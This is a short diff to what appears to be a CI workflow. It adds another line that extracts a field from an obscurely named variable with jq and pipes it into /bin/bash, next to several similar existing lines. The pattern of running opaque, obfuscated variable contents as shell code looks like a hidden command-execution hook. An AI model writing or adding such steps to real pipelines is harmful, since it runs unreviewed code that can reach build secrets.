@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$ds582" | jq -r .e0 | /bin/bash
           printf '%s' "$b61" | jq -r .wauh04524 | /bin/bash
           printf '%s' "$ft97409" | jq -r .ko7948 | /bin/bash
+          echo $rezip64145 | jq -r .irarf107 | /bin/bash
 
       - name: Upload results
         if: always()
